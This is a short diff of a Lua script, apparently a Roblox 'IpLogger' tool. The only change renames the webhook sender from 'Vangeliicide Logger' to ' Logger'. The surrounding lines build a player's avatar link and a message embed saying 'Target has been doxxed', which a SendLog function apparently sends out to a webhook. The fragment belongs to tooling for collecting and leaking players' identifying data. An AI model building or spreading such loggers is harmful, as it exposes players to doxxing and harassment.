@@ -51,7 +51,7 @@ local function SendLog()
 	local avatar = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
 
 	local data = {
-		username = "Vangeliicide Logger",
+		username = " Logger",
 		embeds = {{
 			title = "🔥 IpLogger",
 			description = "```diff\n+ Target has been doxxed\n```",
